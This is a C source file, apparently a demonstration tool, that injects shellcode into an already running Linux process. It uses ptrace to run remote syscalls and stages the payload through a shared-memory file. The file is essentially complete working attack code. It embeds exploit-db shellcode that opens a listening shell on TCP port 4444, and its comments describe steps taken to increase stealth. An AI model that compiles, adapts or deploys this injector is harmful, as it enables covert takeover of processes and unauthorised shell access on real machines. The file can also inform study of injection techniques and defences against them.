/*
 * no automatic checks, compile using gcc: "gcc <source>" 
 * Ptrace example of split permission code injection, targeting an
 * already running process
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/uio.h>

#define die(__kall__, __msg__) \
	({ \
	 	int ____rv____; \
	 	____rv____ = __kall__; \
	 	if(____rv____ < 0) { \
	 		perror(__msg__); \
	 		exit(EXIT_FAILURE); \
	 	} \
	 	____rv____; \
	 })

#define save_uregs(name1, name1mod, name2) \
	struct user_regs_struct name1; \
	struct user_regs_struct name1mod; \
	struct user_fpregs_struct name2; \
	die(ptrace(PTRACE_GETREGS, pid, NULL, &(name1)), "ptrace(PTRACE_GETREGS)"); \
	die(ptrace(PTRACE_GETFPREGS, pid, NULL, &(name2)), "ptrace(PTRACE_GETFPREGS)"); \
	memcpy(&name1mod, &name1, sizeof(struct user_regs_struct))

#define restore_uregs(name1, name2) \
	die(ptrace(PTRACE_SETREGS, pid, NULL, &(name1)), "ptrace(PTRACE_SETREGS)"); \
	die(ptrace(PTRACE_SETFPREGS, pid, NULL, &(name2)), "ptrace(PTRACE_SETFPREGS)")

static unsigned long remote_syscall_instr;

static void __remote_do_syscall(pid_t pid, struct user_regs_struct *urs)
{
	die(ptrace(PTRACE_SETREGS, pid, NULL, urs), "ptrace(PTRACE_SETREGS)");
	die(ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL), "ptrace(PTRACE_SINGLESTEP)");
	die(waitpid(pid, NULL, 0), "waitpid");
	die(ptrace(PTRACE_GETREGS, pid, NULL, urs), "ptrace(PTRACE_GETREGS)");
}

static void remote_mmap(pid_t pid, struct user_regs_struct *urs, 
		void *addr, size_t size, int prot, int flags, int fd, off_t offset)
{
	urs->rax = SYS_mmap;
	urs->rdi = (unsigned long) addr;
	urs->rsi = size;
	urs->rdx = prot;
	urs->r10 = flags;
	urs->r8  = fd;
	urs->r9  = offset;
	urs->rip = remote_syscall_instr;

	__remote_do_syscall(pid, urs);
}

static void remote_munmap(pid_t pid, struct user_regs_struct *urs,
		void *addr, size_t size)
{
	urs->rax = SYS_munmap;
	urs->rdi = (unsigned long) addr;
	urs->rsi = size;
	urs->rip = remote_syscall_instr;

	__remote_do_syscall(pid, urs);
}

/* you cannot read child PID by reading RAX, see PTRACE_EVENTs */
static void remote_fork(pid_t pid, struct user_regs_struct *urs)
{
	urs->rax = SYS_fork;
	urs->rip = remote_syscall_instr;

	__remote_do_syscall(pid, urs);
}

static void remote_open(pid_t pid, struct user_regs_struct *urs,
		const char* filename, int flags, mode_t mode)
{
	urs->rax = SYS_open;
	urs->rdi = (unsigned long) filename;
	urs->rsi = flags;
	urs->rdx = mode;
	urs->rip = remote_syscall_instr;

	__remote_do_syscall(pid, urs);
}

/* allow the user to do ptrace(PTRACE_DETACH) properly */
static void remote_exit_and_detach(pid_t pid, struct user_regs_struct *urs,
		int code)
{
	urs->rax = SYS_exit;
	urs->rdi = code;
	urs->rip = remote_syscall_instr;

	die(ptrace(PTRACE_SETREGS, pid, NULL, urs), "ptrace(PTRACE_SETREGS)");
	die(ptrace(PTRACE_DETACH, pid, NULL, NULL), "ptrace(PTRACE_DETACH)");
}

static unsigned long write_process_memory(pid_t pid, const char* data, ssize_t data_size)
{
	struct iovec local_vec[1];
	struct iovec remote_vec[1];
	ssize_t err;

	save_uregs(uregs, mmap_uregs, ufpregs);

	remote_mmap(pid, &mmap_uregs, 
			NULL, data_size, PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if((void*) mmap_uregs.rax == MAP_FAILED)
		goto __restore;

	local_vec[0].iov_base = (void*) data;
	local_vec[0].iov_len = data_size;

	remote_vec[0].iov_base = (void*) mmap_uregs.rax;
	remote_vec[0].iov_len = data_size;

	err = process_vm_writev(pid, local_vec, 1, remote_vec, 1, 0);
	if(err != data_size) {
		perror("process_vm_writev");
		remote_munmap(pid, &mmap_uregs, (void*) mmap_uregs.rax, data_size);
		mmap_uregs.rax = (unsigned long) MAP_FAILED;
	}

__restore:
	restore_uregs(uregs, ufpregs);
	return mmap_uregs.rax;
}

/* look for libc in /proc/<pid>/maps */
static unsigned long scan_process_vmas(pid_t pid)
{
	FILE *fp;
	char *line = NULL;
    size_t len = 0;
    ssize_t rv;
    char *va_start = NULL;
    char *filename;
    char *perms;
	char procmaps[FILENAME_MAX];
	unsigned long res = 0;

	snprintf(procmaps, FILENAME_MAX, "/proc/%d/maps", pid);

	fp = fopen(procmaps, "r");
	if(!fp) {
		perror("fopen(procmaps)");
		exit(EXIT_FAILURE);
	}

	while ((rv = getline(&line, &len, fp)) != -1) {
        va_start = strtok(line, "-");

        /* skip non-interesting parts of the virtual memory region entries */
        strtok(NULL, " ");

        perms = strtok(NULL, " ");
        if(!strchr(perms, 'x'))
        	continue;

        /* skip non-interesting parts of the virtual memory region entries */
        strtok(NULL, " ");
        strtok(NULL, " ");
        strtok(NULL, " ");

        filename = strtok(NULL, "\n");
        if (filename)
            while (*filename == ' ')
            	filename++;

        if(filename && strstr(filename, "libc.so")) {
        	printf("found compatible memory region: %s, %s -> %s\n", va_start, perms, filename);
        	break;
        }
    }

	if(va_start)
		res = strtoul(va_start, NULL, 16);

	free(line);
	fclose(fp);

	return res;
}

static void find_syscall_instr(pid_t pid, unsigned long text)
{
	int err;
	unsigned long remote_vaddr = text;
	char buf[4096];

	struct iovec local_vec[1];
	struct iovec remote_vec[1];

	while(1) {
		local_vec[0].iov_base = buf;
		local_vec[0].iov_len = 4096;

		remote_vec[0].iov_base = (void*) remote_vaddr;
		remote_vec[0].iov_len = 4096;

		err = process_vm_readv(pid, local_vec, 1, remote_vec, 1, 0);
		if(err < 0)
			goto __skip_scan;

		for(int i = 0; i < err - 1; i++) {
			printf("scanning addr @ %p...\r", (void*) remote_vaddr + i);
			fflush(stdout);

			if(buf[i] == 0x0f && buf[i + 1] == 0x05) {
				remote_syscall_instr = remote_vaddr + i;
				printf("found syscall instr @ %p\n", (void*) remote_syscall_instr);

				return;
			}
		}

__skip_scan:
		remote_vaddr += 4096;
	}
}

/*
 * This actually spawns a child process with its own copied address space,
 * not really a "thread" / LWP as intended in userspace terminology
 */
static pid_t create_remote_thread(pid_t pid)
{
	pid_t forked_pid;
	save_uregs(uregs, fork_uregs, ufpregs);

	/* we may also use clone to create a proper "lightweight process" / LWP / thread */
	die(ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACEFORK), "ptrace(PTRACE_SETOPTIONS)");

	/* we may also use clone, again. */
	remote_fork(pid, &fork_uregs);

	/* get pid of newly-created process. Automatically traced. */
	die(ptrace(PTRACE_GETEVENTMSG, pid, NULL, &forked_pid), "ptrace(PTRACE_GETEVENTMSG)");

	printf("spawned child process with pid=%d\n", forked_pid);

	restore_uregs(uregs, ufpregs);
	return forked_pid;
}

static int local_open_shm_write_shellcode(const char *shmname, const char* shellcode, size_t scsize)
{
	int shmfd = shm_open(shmname, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR | S_IROTH);
	
	if(shmfd < 0) {
		perror("shm_open");
		return 0;
	}

	if(ftruncate(shmfd, scsize)) {
		perror("ftruncate");
		goto __failure_unlink;
	}

	char *mem = mmap(NULL, scsize, PROT_READ | PROT_WRITE, MAP_SHARED, shmfd, 0);
	if(mem == MAP_FAILED) {
		perror("mmap");
		goto __failure_unlink;
	}

	memcpy(mem, shellcode, scsize);
	munmap(mem, scsize);
	return 1;

__failure_unlink:
	shm_unlink(shmname);
	return 0;
}

static void remote_open_shm_run_shellcode(pid_t pid, unsigned long namestr_va, size_t data_size)
{
	int shmem_fd;
	
	save_uregs(uregs, syscall_uregs, ufpregs);

	/* shm_open */
	remote_open(pid, &syscall_uregs, (const char*) namestr_va, O_RDONLY, 0);
	if((int) syscall_uregs.rax < 0) {
		fprintf(stderr, "remote shm_open failed with rv=%lld\n", syscall_uregs.rax);
		goto __failure_exit;
	}

	shmem_fd = syscall_uregs.rax;

	/* mmap */
	remote_mmap(pid, &syscall_uregs, 
			NULL, data_size, PROT_EXEC, MAP_SHARED, shmem_fd, 0);

	if((void*) syscall_uregs.rax == MAP_FAILED) {
		fprintf(stderr, "remote mmap failed with rv=%lld\n", syscall_uregs.rax);
		goto __failure_exit;
	}

	/* prepare shellcode execution context */
	printf("about to execute instructions @ %p\n", (void*) syscall_uregs.rax);
	restore_uregs(uregs, ufpregs);
	uregs.rip = syscall_uregs.rax;

	die(ptrace(PTRACE_SETREGS, pid, NULL, &uregs), "ptrace(PTRACE_SETREGS)");

	/* byebye */
	goto __detach_thread;

__failure_exit:
	/* exit and detach */
	remote_exit_and_detach(pid, &syscall_uregs, 0);
	return;

__detach_thread:
	/* keep this: cont and detach */
	die(ptrace(PTRACE_DETACH, pid, NULL, NULL), "ptrace(PTRACE_DETACH)");

	/* 
	 * don't await for anything, don't await to do an exit(EXIT_SUCCESS) wrapper,
	 * just go away as fast as possible by detaching both the newly-created thread and
	 * the parent process!
	 *
	 * restore_uargs(uregs, ufpregs) doesn't make any sense here. Presumably, the shellcode
	 * is properly written and does an exit when done. That is, unreachable code.
	 */
}

#define SHMEM_NAME "shmem"
#define SHMEM_REMOTE_NAME "/dev/shm/" SHMEM_NAME

#define EXIT0_SHELLCODE "\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05"
#define PAUSE_SHELLCODE "\x31\xc0\xb0\x22\x0f\x05"

/* credits for this: https://www.exploit-db.com/exploits/47025 
 *
 * listen on port 4444/tcp for incoming connections :) 
 *
 * Be careful: does execve() to run a shell, task cmdline has changed wrt
 * the original (e.g. your target process), decreases stealthiness (a lot) */
#define REVERSE_SHELL_SHELLCODE \
	"\x6a\x29\x58\x6a\x02\x5f\x6a\x01" \
	"\x5e\x48\x31\xd2\x0f\x05\x48\x97" \
	"\x6a\x02\x66\xc7\x44\x24\x02\x11" \
	"\x5c\x54\x6a\x2a\x58\x5e\x6a\x10" \
	"\x5a\x0f\x05\x6a\x03\x5e\x6a\x21" \
	"\x58\x48\xff\xce\x0f\x05\xe0\xf6" \
	"\x48\x31\xf6\x56\x48\xbf\x2f\x62" \
	"\x69\x6e\x2f\x2f\x73\x68\x57\x54" \
	"\x5f\xb0\x3b\x99\x0f\x05"

#define SHELLCODE REVERSE_SHELL_SHELLCODE

int main(int argc, char **argv)
{
	int exitval = EXIT_FAILURE;
	unsigned long libc_va_start;
	pid_t thr_pid;
	int rv, wstatus;
	pid_t target_pid = -1;
	unsigned long shmem_remote_name_vaddr;

	while((rv = getopt(argc, argv, "p:")) != -1) {
		if(rv == 'p')
			target_pid = atoi(optarg);
	}

	if(target_pid < 1) {
		fprintf(stderr, "%s: invalid pid=%d\n", argv[0], target_pid);
		return EXIT_FAILURE;
	}

	/* attach to the running process */
	die(ptrace(PTRACE_ATTACH, target_pid, NULL, NULL), "ptrace(PTRACE_ATTACH)");
	die(waitpid(target_pid, &wstatus, 0), "waitpid");

	/* look for libc executable code */
	libc_va_start = scan_process_vmas(target_pid);
	if(!libc_va_start)
		goto __target_detach;

	/* scan the target address space for syscall x86 instr bytes */
	find_syscall_instr(target_pid, libc_va_start);
	if(!remote_syscall_instr)
		goto __target_detach;

	/* 
	 * do a remote mmap + write in that memory region: write the shmem name (full path) 
	 * the "/dev/shm/<shmname>" string is written in the parent process memory (the original target_pid). 
	 */
	shmem_remote_name_vaddr = write_process_memory(target_pid, SHMEM_REMOTE_NAME, sizeof(SHMEM_REMOTE_NAME));
	if((void*) shmem_remote_name_vaddr == MAP_FAILED)
		goto __target_detach;

	/* do the remote fork (depending on create_remote_thread impl, may also be a clone), 
	 * ihis should almost never fail... skip error checking
	 *
	 * note that newly created process will remain a zombie, when done, until target process either exits or asks
	 * kernel information about the process (e.g. wait(NULL) or waitpid with proper PID). Task manager observer may
	 * see the strange situation. Don't believe me? do "ps aux | grep 'Z'"
	 */
	thr_pid = create_remote_thread(target_pid);

	/* on THIS process, create shmem, ftrunc, mmap(W) and write the shellcode */
	local_open_shm_write_shellcode(SHMEM_NAME, SHELLCODE, sizeof(SHELLCODE));

	/* on REMOTE (newly-created-child) process open shmem, mmap(X) and exec the shellcode */
	remote_open_shm_run_shellcode(thr_pid, shmem_remote_name_vaddr, sizeof(SHELLCODE));

	/* delete shmem pseudofile now, we don't need it anymore. Increase stealthiness :) */
	shm_unlink(SHMEM_NAME);

	/* everything ok */
	exitval = EXIT_SUCCESS;

	/* detach PARENT process (the original target) */
__target_detach:
	die(ptrace(PTRACE_DETACH, target_pid, NULL, NULL), "ptrace(PTRACE_DETACH)");

	return exitval;
}
